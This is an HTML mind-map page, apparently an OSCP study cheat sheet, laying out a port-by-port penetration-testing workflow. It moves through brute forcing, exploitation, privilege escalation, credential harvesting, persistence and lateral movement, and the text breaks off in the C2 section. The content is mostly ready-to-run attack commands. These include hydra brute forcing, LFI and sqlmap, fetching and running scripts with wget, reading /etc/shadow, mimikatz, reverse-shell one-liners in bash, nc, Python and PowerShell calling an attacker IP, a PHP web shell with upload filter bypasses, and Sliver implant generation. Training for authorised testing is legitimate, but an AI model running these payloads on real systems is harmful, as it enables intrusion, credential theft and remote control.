<!doctype html>
<html>
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="ie=edge" />
<title>Markmap</title>
<style>
* {
  margin: 0;
  padding: 0;
}
html {
  font-family: ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji',
    'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
}
#mindmap {
  display: block;
  width: 100vw;
  height: 100vh;
}
.markmap-dark {
  background: #27272a;
  color: white;
}
</style>
<link rel="stylesheet" href="dist/style.css">
</head>
<body>
<svg id="mindmap"></svg>
<script src="dist/d3.min.js"></script><script src="dist/browser/index.js"></script><script src="dist/index.js"></script><script>(()=>{setTimeout(()=>{const{markmap:S,mm:Q}=window,$=new S.Toolbar;$.attach(Q);const I=$.render();I.setAttribute("style","position:absolute;bottom:20px;right:20px"),document.body.append(I)})})()</script><script>((l,U,M,R)=>{const N=l();window.mm=N.Markmap.create("svg#mindmap",(U||N.deriveOptions)(R),M),window.matchMedia("(prefers-color-scheme: dark)").matches&&document.documentElement.classList.add("markmap-dark")})(()=>window.markmap,null,{"content":"","children":[{"content":"Full Multi-Layered Pentest Workflow by Port (OSCP/Kali)","children":[{"content":"Port Index (Click to Jump)","children":[{"content":"<a href=\"#port-21---ftp-workflow\">21  FTP</a>","children":[],"payload":{"tag":"li","lines":"18,19"}},{"content":"<a href=\"#port-22---ssh-workflow\">22  SSH</a>","children":[],"payload":{"tag":"li","lines":"19,20"}},{"content":"<a href=\"#port-53---dns-workflow\">53  DNS</a>","children":[],"payload":{"tag":"li","lines":"20,21"}},{"content":"<a href=\"#port-80443---httphttps-workflow\">80443  HTTPHTTPS</a>","children":[],"payload":{"tag":"li","lines":"21,22"}},{"content":"<a href=\"#port-139445---smb-workflow\">139445  SMB</a>","children":[],"payload":{"tag":"li","lines":"22,23"}},{"content":"<a href=\"#port-161---snmp-workflow\">161  SNMP</a>","children":[],"payload":{"tag":"li","lines":"23,24"}},{"content":"<a href=\"#port-389---ldap-workflow\">389  LDAP</a>","children":[],"payload":{"tag":"li","lines":"24,25"}},{"content":"<a href=\"#port-3306---mysql-workflow\">3306  MySQL</a>","children":[],"payload":{"tag":"li","lines":"25,26"}},{"content":"<a href=\"#port-3389---rdp-workflow\">3389  RDP</a>","children":[],"payload":{"tag":"li","lines":"26,27"}},{"content":"<a href=\"#port-5985---winrm-workflow\">5985  WinRM</a>","children":[],"payload":{"tag":"li","lines":"27,29"}}],"payload":{"tag":"h2","lines":"16,17"}},{"content":"Port 21 - FTP Workflow","children":[{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"33,36\"><code class=\"language-bash\">nmap -p 21 -sV --script ftp-anon,ftp-bounce &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"33,36"}}],"payload":{"tag":"h3","lines":"31,32"}},{"content":"Output Possibilities","children":[{"content":"Anonymous login allowed","children":[],"payload":{"tag":"li","lines":"38,39"}},{"content":"FTP version detected (e.g., vsftpd 2.3.4)","children":[],"payload":{"tag":"li","lines":"39,40"}},{"content":"Login required","children":[],"payload":{"tag":"li","lines":"40,41"}},{"content":"No response","children":[],"payload":{"tag":"li","lines":"41,43"}}],"payload":{"tag":"h3","lines":"37,38"}},{"content":"Step 1: Anonymous Login","children":[{"content":"<pre data-lines=\"47,50\"><code class=\"language-bash\">ftp &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"47,50"}},{"content":"<pre data-lines=\"52,57\"><code class=\"language-bash\"><span class=\"hljs-built_in\">ls</span>\nget &lt;file&gt;\nput &lt;payload&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"52,57"}}],"payload":{"tag":"h3","lines":"45,46"}},{"content":"Step 2: Brute Force Credentials","children":[{"content":"<pre data-lines=\"67,70\"><code class=\"language-bash\">hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"67,70"}}],"payload":{"tag":"h3","lines":"65,66"}},{"content":"Step 3: Version-Based Exploits","children":[{"content":"<pre data-lines=\"80,83\"><code class=\"language-bash\">searchsploit vsftpd 2.3.4\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"80,83"}},{"content":"<pre data-lines=\"85,88\"><code class=\"language-bash\">nc &lt;target&gt; 6200\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"85,88"}}],"payload":{"tag":"h3","lines":"78,79"}}],"payload":{"tag":"h2","lines":"29,30"}},{"content":"Port 22 - SSH Workflow","children":[{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"95,98\"><code class=\"language-bash\">nmap -p 22 -sV --script ssh2-enum-algos,ssh-hostkey &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"95,98"}}],"payload":{"tag":"h3","lines":"93,94"}},{"content":"Step 1: Credential Brute Force","children":[{"content":"<pre data-lines=\"101,104\"><code class=\"language-bash\">hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"101,104"}},{"content":"<pre data-lines=\"106,109\"><code class=\"language-bash\">ssh user@&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"106,109"}}],"payload":{"tag":"h3","lines":"99,100"}},{"content":"Step 2: Key-Based Access","children":[{"content":"<pre data-lines=\"118,121\"><code class=\"language-bash\">ssh -i id_rsa user@&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"118,121"}}],"payload":{"tag":"h3","lines":"112,113"}},{"content":"Step 3: SSH Misconfig or Exploits","children":[{"content":"Check for old/vulnerable SSH versions","children":[],"payload":{"tag":"li","lines":"126,127"}},{"content":"Use <code>searchsploit</code> if version known","children":[],"payload":{"tag":"li","lines":"127,129"}}],"payload":{"tag":"h3","lines":"124,125"}}],"payload":{"tag":"h2","lines":"91,92"}},{"content":"Port 80/443  HTTP(S) Workflow","children":[{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"135,138\"><code class=\"language-bash\">nmap -p 80,443 -sV --script http-title,http-enum,http-methods &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"135,138"}}],"payload":{"tag":"h3","lines":"133,134"}},{"content":"Step 1: Service Fingerprinting","children":[{"content":"<pre data-lines=\"143,146\"><code class=\"language-bash\">whatweb http://&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"143,146"}},{"content":"<pre data-lines=\"147,150\"><code class=\"language-bash\">curl -I http://&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"147,150"}}],"payload":{"tag":"h3","lines":"141,142"}},{"content":"Step 2: Directory/File Enumeration","children":[{"content":"<pre data-lines=\"155,158\"><code class=\"language-bash\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://&lt;target&gt; -w /usr/share/wordlists/dirb/common.txt\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"155,158"}}],"payload":{"tag":"h3","lines":"153,154"}},{"content":"Step 3: Common Vulns","children":[{"content":"File Upload","children":[{"content":"Try uploading <code>php-reverse-shell.php</code>","children":[],"payload":{"tag":"li","lines":"168,170"}}],"payload":{"tag":"h4","lines":"167,168"}},{"content":"LFI","children":[{"content":"<pre data-lines=\"171,174\"><code class=\"language-bash\">http://&lt;target&gt;/?page=../../../../etc/passwd\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"171,174"}}],"payload":{"tag":"h4","lines":"170,171"}},{"content":"SQLi","children":[{"content":"<pre data-lines=\"176,179\"><code class=\"language-bash\">sqlmap -u <span class=\"hljs-string\">&quot;http://&lt;target&gt;/index.php?id=1&quot;</span> --batch\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"176,179"}}],"payload":{"tag":"h4","lines":"175,176"}}],"payload":{"tag":"h3","lines":"165,166"}}],"payload":{"tag":"h2","lines":"131,132"}},{"content":"Port 139445 - SMB Workflow","children":[{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"186,189\"><code class=\"language-bash\">nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"186,189"}}],"payload":{"tag":"h3","lines":"184,185"}},{"content":"Step 1: Null Session / Share Enum","children":[{"content":"<pre data-lines=\"194,197\"><code class=\"language-bash\">smbclient -L //&lt;target&gt; -N\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"194,197"}},{"content":"<pre data-lines=\"198,201\"><code class=\"language-bash\">enum4linux -a &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"198,201"}},{"content":"<pre data-lines=\"202,205\"><code class=\"language-bash\">smbmap -H &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"202,205"}}],"payload":{"tag":"h3","lines":"192,193"}},{"content":"Step 2: Access Shares","children":[{"content":"<pre data-lines=\"210,213\"><code class=\"language-bash\">smbclient //&lt;target&gt;/share -N\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"210,213"}}],"payload":{"tag":"h3","lines":"208,209"}},{"content":"Step 3: Bruteforce or Exploit","children":[{"content":"<pre data-lines=\"220,223\"><code class=\"language-bash\">hydra -L users.txt -P rockyou.txt smb://&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"220,223"}},{"content":"<pre data-lines=\"225,228\"><code class=\"language-bash\">nmap --script smb-vuln-ms17-010 -p 445 &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"225,228"}}],"payload":{"tag":"h3","lines":"218,219"}}],"payload":{"tag":"h2","lines":"182,183"}},{"content":"Port 53 - DNS Workflow","children":[{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"235,238\"><code class=\"language-bash\">nmap -p 53 -sU -sV --script dns-recursion,dns-service-discovery &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"235,238"}}],"payload":{"tag":"h3","lines":"233,234"}},{"content":"Step 1: Zone Transfer","children":[{"content":"<pre data-lines=\"243,246\"><code class=\"language-bash\">dig axfr @&lt;target&gt; domain.com\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"243,246"}}],"payload":{"tag":"h3","lines":"241,242"}},{"content":"Step 2: Brute-force Subdomains","children":[{"content":"<pre data-lines=\"255,259\"><code class=\"language-bash\">dnsenum domain.com\nfierce -dns domain.com\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"255,259"}}],"payload":{"tag":"h3","lines":"253,254"}}],"payload":{"tag":"h2","lines":"231,232"}},{"content":"Port 161 - SNMP Workflow","children":[{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"270,273\"><code class=\"language-bash\">nmap -sU -p 161 --script snmp-info &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"270,273"}}],"payload":{"tag":"h3","lines":"268,269"}},{"content":"Step 1: Community String Check","children":[{"content":"<pre data-lines=\"278,281\"><code class=\"language-bash\">snmpwalk -v2c -c public &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"278,281"}},{"content":"<pre data-lines=\"282,285\"><code class=\"language-bash\">onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"282,285"}}],"payload":{"tag":"h3","lines":"276,277"}},{"content":"Step 2: Data Extraction","children":[{"content":"Usernames","children":[],"payload":{"tag":"li","lines":"290,291"}},{"content":"Running processes","children":[],"payload":{"tag":"li","lines":"291,292"}},{"content":"Network interfaces","children":[],"payload":{"tag":"li","lines":"292,293"}},{"content":"Routing tables","children":[],"payload":{"tag":"li","lines":"293,295"}}],"payload":{"tag":"h3","lines":"288,289"}}],"payload":{"tag":"h2","lines":"266,267"}},{"content":"Port 389 - LDAP Workflow","children":[{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"306,309\"><code class=\"language-bash\">nmap -p 389 --script ldap-search &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"306,309"}}],"payload":{"tag":"h3","lines":"304,305"}},{"content":"Step 1: Anonymous LDAP Bind and Dump","children":[{"content":"Attempt anonymous bind:","children":[{"content":"<pre data-lines=\"315,318\"><code class=\"language-bash\">ldapsearch -x -H ldap://&lt;target&gt; -b <span class=\"hljs-string\">&quot;dc=example,dc=com&quot;</span>\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"315,318"}},{"content":"<pre data-lines=\"321,327\"><code class=\"language-text\">dn: cn=John Doe,ou=Users,dc=example,dc=com\ncn: John Doe\nsAMAccountName: jdoe\nuserPrincipalName: jdoe@example.com\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"321,327"}}],"payload":{"tag":"h4","lines":"314,315"}}],"payload":{"tag":"h3","lines":"312,313"}},{"content":"Step 2: Extract Usernames for Brute-Force or Enumeration","children":[{"content":"Parse results to build a list:","children":[{"content":"<pre data-lines=\"333,336\"><code class=\"language-bash\">ldapsearch -x -H ldap://&lt;target&gt; -b <span class=\"hljs-string\">&quot;dc=example,dc=com&quot;</span> | grep sAMAccountName | <span class=\"hljs-built_in\">cut</span> -d <span class=\"hljs-string\">&quot; &quot;</span> -f2 &gt; users.txt\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"333,336"}}],"payload":{"tag":"h4","lines":"332,333"}}],"payload":{"tag":"h3","lines":"330,331"}},{"content":"Step 3: Search for Admin Groups and Policies","children":[{"content":"<pre data-lines=\"349,352\"><code class=\"language-bash\">ldapsearch -x -H ldap://&lt;target&gt; -b <span class=\"hljs-string\">&quot;dc=example,dc=com&quot;</span> <span class=\"hljs-string\">&quot;(objectClass=group)&quot;</span> | grep -i admin\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"349,352"}}],"payload":{"tag":"h3","lines":"347,348"}},{"content":"Step 4: Advanced Attribute Discovery","children":[{"content":"Check for password policies, descriptions, or last logon:","children":[{"content":"<pre data-lines=\"368,371\"><code class=\"language-bash\">ldapsearch -x -H ldap://&lt;target&gt; -b <span class=\"hljs-string\">&quot;dc=example,dc=com&quot;</span> <span class=\"hljs-string\">&quot;(objectClass=person)&quot;</span> displayName mail description\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"368,371"}}],"payload":{"tag":"h4","lines":"366,367"}}],"payload":{"tag":"h3","lines":"364,365"}},{"content":"If Bind Fails:","children":[{"content":"Try default creds:<pre data-lines=\"382,385\"><code class=\"language-bash\">ldapsearch -x -H ldap://&lt;target&gt; -D <span class=\"hljs-string\">&quot;cn=admin,dc=example,dc=com&quot;</span> -w admin\n</code></pre>","children":[],"payload":{"tag":"li","lines":"381,385"}},{"content":"Try password spraying with usernames from other sources (e.g., SMB, HTTP)","children":[],"payload":{"tag":"li","lines":"385,387"}}],"payload":{"tag":"h3","lines":"379,380"}},{"content":"LDAP Feeds Into:","children":[{"content":"SMB: Enumerated users  <code>enum4linux</code>, <code>smbclient</code>","children":[],"payload":{"tag":"li","lines":"391,392"}},{"content":"WinRM/RDP brute-force  prioritize <code>Domain Admin</code> users","children":[],"payload":{"tag":"li","lines":"392,393"}},{"content":"Kerberos (if port 88 open)  AS-REP roasting or kerberoasting","children":[],"payload":{"tag":"li","lines":"393,395"}}],"payload":{"tag":"h3","lines":"389,390"}},{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"397,400\"><code class=\"language-bash\">nmap -p 389 --script ldap-search &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"397,400"}}],"payload":{"tag":"h3","lines":"395,396"}},{"content":"Step 1: LDAP Dump","children":[{"content":"<pre data-lines=\"405,408\"><code class=\"language-bash\">ldapsearch -x -h &lt;target&gt; -b <span class=\"hljs-string\">&quot;dc=example,dc=com&quot;</span>\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"405,408"}}],"payload":{"tag":"h3","lines":"403,404"}}],"payload":{"tag":"h2","lines":"300,301"}},{"content":"Port 3306 - MySQL Workflow","children":[{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"419,422\"><code class=\"language-bash\">nmap -p 3306 --script mysql-info &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"419,422"}}],"payload":{"tag":"h3","lines":"417,418"}},{"content":"Step 1: Try Default Logins","children":[{"content":"<pre data-lines=\"427,430\"><code class=\"language-bash\">mysql -u root -h &lt;target&gt; -p\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"427,430"}}],"payload":{"tag":"h3","lines":"425,426"}},{"content":"Step 2: Brute Force","children":[{"content":"<pre data-lines=\"433,436\"><code class=\"language-bash\">hydra -L users.txt -P rockyou.txt mysql://&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"433,436"}}],"payload":{"tag":"h3","lines":"431,432"}},{"content":"Step 3: Exploit Access","children":[{"content":"Dump creds: <code>select user, password from mysql.user;</code>","children":[],"payload":{"tag":"li","lines":"441,442"}},{"content":"Privilege Escalation via UDF if root access","children":[],"payload":{"tag":"li","lines":"442,444"}}],"payload":{"tag":"h3","lines":"439,440"}}],"payload":{"tag":"h2","lines":"415,416"}},{"content":"Port 3389 - RDP Workflow","children":[{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"450,453\"><code class=\"language-bash\">nmap -p 3389 --script rdp-enum-encryption &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"450,453"}}],"payload":{"tag":"h3","lines":"448,449"}},{"content":"Step 1: Brute Force","children":[{"content":"<pre data-lines=\"458,461\"><code class=\"language-bash\">hydra -t 4 -V -f -l user -P rockyou.txt rdp://&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"458,461"}}],"payload":{"tag":"h3","lines":"456,457"}},{"content":"If successful:","children":[{"content":"<pre data-lines=\"464,467\"><code class=\"language-bash\">xfreerdp /u:user /p:pass /v:&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"464,467"}}],"payload":{"tag":"h3","lines":"462,463"}}],"payload":{"tag":"h2","lines":"446,447"}},{"content":"Port 5985 - WinRM Workflow","children":[{"content":"Nmap Detection","children":[{"content":"<pre data-lines=\"474,477\"><code class=\"language-bash\">nmap -p 5985 -sV &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"474,477"}}],"payload":{"tag":"h3","lines":"472,473"}},{"content":"Step 1: WinRM Access","children":[{"content":"<pre data-lines=\"482,485\"><code class=\"language-bash\">evil-winrm -i &lt;target&gt; -u user -p password\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"482,485"}}],"payload":{"tag":"h3","lines":"480,481"}}],"payload":{"tag":"h2","lines":"470,471"}}],"payload":{"tag":"h1","lines":"12,13"}},{"content":"Privilege Escalation Flow","children":[{"content":"Linux","children":[{"content":"Enumeration","children":[{"content":"<pre data-lines=\"499,506\"><code class=\"language-bash\"><span class=\"hljs-built_in\">whoami</span>\n<span class=\"hljs-built_in\">id</span>\n<span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">uname</span> -a\nps aux\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"499,506"}},{"content":"<pre data-lines=\"508,511\"><code class=\"language-bash\">find / -perm -4000 2&gt;/dev/null\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"508,511"}},{"content":"<pre data-lines=\"513,516\"><code class=\"language-bash\"><span class=\"hljs-built_in\">cat</span> /etc/crontab\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"513,516"}},{"content":"<pre data-lines=\"518,521\"><code class=\"language-bash\">wget http://&lt;host&gt;/linpeas.sh &amp;&amp; <span class=\"hljs-built_in\">chmod</span> +x linpeas.sh &amp;&amp; ./linpeas.sh\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"518,521"}},{"content":"<pre data-lines=\"523,526\"><code class=\"language-bash\">wget http://&lt;host&gt;/lse.sh &amp;&amp; <span class=\"hljs-built_in\">chmod</span> +x lse.sh &amp;&amp; ./lse.sh\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"523,526"}}],"payload":{"tag":"h3","lines":"497,498"}},{"content":"Exploitation Paths","children":[{"content":"Misconfigured SUDO (NOPASSWD)","children":[],"payload":{"tag":"li","lines":"529,530"}},{"content":"Writable scripts in cron","children":[],"payload":{"tag":"li","lines":"530,531"}},{"content":"SUID binaries like <code>cp</code>, <code>nmap</code>, <code>perl</code>","children":[],"payload":{"tag":"li","lines":"531,532"}},{"content":"Kernel exploits (Dirty COW, overlayfs, etc.)","children":[],"payload":{"tag":"li","lines":"532,534"}}],"payload":{"tag":"h3","lines":"527,528"}}],"payload":{"tag":"h2","lines":"495,496"}},{"content":"Windows","children":[{"content":"Enumeration","children":[{"content":"<pre data-lines=\"540,546\"><code class=\"language-powershell\">whoami /priv\nsysteminfo\nnet user\nnet localgroup administrators\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"540,546"}},{"content":"<pre data-lines=\"549,553\"><code class=\"language-powershell\">. .\\PowerUp.ps1\nInvoke-AllChecks\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"549,553"}}],"payload":{"tag":"h3","lines":"538,539"}},{"content":"Exploitation Paths","children":[{"content":"Unquoted service paths","children":[],"payload":{"tag":"li","lines":"556,557"}},{"content":"AlwaysInstallElevated","children":[],"payload":{"tag":"li","lines":"557,558"}},{"content":"Insecure service permissions","children":[],"payload":{"tag":"li","lines":"558,559"}},{"content":"DLL hijacking","children":[],"payload":{"tag":"li","lines":"559,560"}},{"content":"Token impersonation (PrintSpoofer, JuicyPotato, RoguePotato)","children":[],"payload":{"tag":"li","lines":"560,562"}}],"payload":{"tag":"h3","lines":"554,555"}}],"payload":{"tag":"h2","lines":"536,537"}}],"payload":{"tag":"h1","lines":"493,494"}},{"content":"Post-Exploitation","children":[{"content":"Credential Harvesting","children":[{"content":"<pre data-lines=\"569,574\"><code class=\"language-bash\"><span class=\"hljs-built_in\">cat</span> /etc/passwd\n<span class=\"hljs-built_in\">cat</span> /etc/shadow  <span class=\"hljs-comment\"># if root</span>\n<span class=\"hljs-built_in\">cat</span> ~/.bash_history\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"569,574"}},{"content":"<pre data-lines=\"576,579\"><code class=\"language-powershell\">mimikatz\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"576,579"}}],"payload":{"tag":"h2","lines":"566,567"}},{"content":"Loot Locations","children":[{"content":"Browser credential stores","children":[],"payload":{"tag":"li","lines":"582,583"}},{"content":"FileZilla, WinSCP, KeePass config","children":[],"payload":{"tag":"li","lines":"583,584"}},{"content":"Saved RDP creds","children":[],"payload":{"tag":"li","lines":"584,585"}},{"content":"SSH private keys","children":[],"payload":{"tag":"li","lines":"585,586"}},{"content":"SAM + SYSTEM (Windows)","children":[],"payload":{"tag":"li","lines":"586,588"}}],"payload":{"tag":"h2","lines":"580,581"}},{"content":"Persistence Techniques","children":[{"content":"Linux: cron jobs, bashrc backdoors, startup services","children":[],"payload":{"tag":"li","lines":"590,591"}},{"content":"Windows: registry run keys, schtasks, services, DLL injection","children":[],"payload":{"tag":"li","lines":"591,593"}}],"payload":{"tag":"h2","lines":"588,589"}}],"payload":{"tag":"h1","lines":"564,565"}},{"content":"Lateral Movement Playbook","children":[{"content":"Windows","children":[{"content":"<pre data-lines=\"600,603\"><code class=\"language-bash\">evil-winrm -i &lt;target&gt; -u &lt;user&gt; -p &lt;pass&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"600,603"}},{"content":"<pre data-lines=\"605,608\"><code class=\"language-bash\">psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"605,608"}},{"content":"<pre data-lines=\"610,613\"><code class=\"language-bash\">xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"610,613"}}],"payload":{"tag":"h2","lines":"597,598"}},{"content":"Linux","children":[{"content":"<pre data-lines=\"617,620\"><code class=\"language-bash\">ssh -L 1080:&lt;target&gt;:22 user@jumpbox\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"617,620"}},{"content":"<pre data-lines=\"622,625\"><code class=\"language-bash\">proxychains nmap -sT -Pn -p- &lt;internal-ip&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"622,625"}}],"payload":{"tag":"h2","lines":"614,615"}},{"content":"Tunneling &amp; Tools","children":[{"content":"<pre data-lines=\"629,633\"><code class=\"language-bash\">chisel server -p 8000 --reverse\nchisel client &lt;attacker&gt;:8000 R:1080:10.0.0.5:22\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"629,633"}},{"content":"<pre data-lines=\"635,638\"><code class=\"language-bash\">socat TCP-LISTEN:9001,reuseaddr,fork TCP:10.0.0.5:445\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"635,638"}},{"content":"<pre data-lines=\"640,643\"><code class=\"language-bash\">ssh -D 9050 user@pivot\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"640,643"}}],"payload":{"tag":"h2","lines":"626,627"}}],"payload":{"tag":"h1","lines":"595,596"}},{"content":"Reverse Shell Cheatsheets","children":[{"content":"Linux Reverse Shells","children":[{"content":"<pre data-lines=\"651,654\"><code class=\"language-bash\">bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/4444 0&gt;&amp;1\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"651,654"}},{"content":"<pre data-lines=\"656,659\"><code class=\"language-bash\">nc -e /bin/bash &lt;attacker_ip&gt; 4444\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"656,659"}},{"content":"<pre data-lines=\"661,664\"><code class=\"language-bash\"><span class=\"hljs-built_in\">rm</span> /tmp/f; <span class=\"hljs-built_in\">mkfifo</span> /tmp/f; <span class=\"hljs-built_in\">cat</span> /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc &lt;attacker_ip&gt; 4444 &gt; /tmp/f\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"661,664"}},{"content":"<pre data-lines=\"666,669\"><code class=\"language-bash\">python3 -c <span class=\"hljs-string\">&apos;import socket,subprocess,os;s=socket.socket();s.connect((&quot;&lt;ip&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;])&apos;</span>\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"666,669"}}],"payload":{"tag":"h2","lines":"648,649"}},{"content":"Windows Reverse Shells","children":[{"content":"<pre data-lines=\"673,676\"><code class=\"language-powershell\">powershell -nop -c &quot;&#x24;client = New-Object System.Net.Sockets.TCPClient(&apos;&lt;ip&gt;&apos;,4444);&#x24;stream = &#x24;client.GetStream();[byte[]]&#x24;bytes = 0..65535|%{0};while((&#x24;i = &#x24;stream.Read(&#x24;bytes, 0, &#x24;bytes.Length)) -ne 0){;&#x24;data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(&#x24;bytes,0, &#x24;i);&#x24;sendback = (iex &#x24;data 2&gt;&amp;1 | Out-String );&#x24;sendback2  = &#x24;sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;&#x24;sendbyte = ([text.encoding]::ASCII).GetBytes(&#x24;sendback2);&#x24;stream.Write(&#x24;sendbyte,0,&#x24;sendbyte.Length);&#x24;stream.Flush()}&quot;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"673,676"}},{"content":"<pre data-lines=\"678,681\"><code class=\"language-cmd\">nc.exe &lt;attacker_ip&gt; 4444 -e cmd.exe\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"678,681"}}],"payload":{"tag":"h2","lines":"670,671"}}],"payload":{"tag":"h1","lines":"646,647"}},{"content":"Web Shells","children":[{"content":"PHP Web Shell","children":[{"content":"<pre data-lines=\"687,690\"><code class=\"language-php\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-title function_ invoke__\">system</span>(<span class=\"hljs-variable\">&#x24;_GET</span>[<span class=\"hljs-string\">&apos;cmd&apos;</span>]); <span class=\"hljs-meta\">?&gt;</span>\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"687,690"}}],"payload":{"tag":"h2","lines":"686,687"}},{"content":"Simple Uploaders","children":[{"content":"Try uploading <code>.php</code>, <code>.phtml</code>, <code>.php5</code> depending on server config.","children":[],"payload":{"tag":"li","lines":"693,694"}},{"content":"Bypass filters by encoding payload or using alternate extensions (e.g., <code>shell.jpg.php</code>)","children":[],"payload":{"tag":"li","lines":"694,696"}}],"payload":{"tag":"h2","lines":"691,692"}},{"content":"Access","children":[{"content":"<pre data-lines=\"698,701\"><code class=\"language-bash\">curl http://target/shell.php?cmd=<span class=\"hljs-built_in\">whoami</span>\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"698,701"}}],"payload":{"tag":"h2","lines":"696,697"}}],"payload":{"tag":"h1","lines":"684,685"}},{"content":"Command and Control (C2) Frameworks","children":[{"content":"Sliver","children":[{"content":"<pre data-lines=\"709,712\"><code class=\"language-bash\">sliver-server\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"709,712"}},{"content":"<pre data-lines=\"714,717\"><code class=\"language-bash\">generate --mtls &lt;ip&gt;:443 --name stealth --os windows\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"714,717"}}],"payload":{"tag":"h2","lines":"706,707"}},{"content":"Cobalt Strike (licensed only)","children":[{"content":"Use with Beacon payloads","children":[],"payload":{"tag":"li","lines":"720,721"}},{"content":"Advanced post-exploitation and lateral 